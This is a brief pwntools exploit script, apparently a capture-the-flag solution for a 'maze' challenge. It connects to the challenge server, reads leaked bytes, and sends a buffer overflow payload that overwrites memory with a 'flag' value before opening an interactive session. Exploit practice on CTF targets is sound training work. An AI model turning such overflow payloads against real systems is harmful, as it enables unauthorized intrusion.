from pwn import *
import random

p = remote('maze.chal.perfect.blue', 1)
#context.log_level = 'debug'

addr = 0x56500994
tmp = random.randint(0, 255)
addr |= tmp << 12

p.sendlineafter("(Y/n) ", "n")
p.recvuntil("ef be ad de")
libc = b''
for i in range(4):
    p.recvuntil(' ')
    libc += p.recv(2)
print(libc)

payload = b''
payload += b'A' * 0x30
payload += p32(0x67616c66)
#payload += 'A' * 0xc
#payload += p32(addr)

p.sendlineafter("text: ", payload)

print('addr: '+hex(addr))

p.interactive()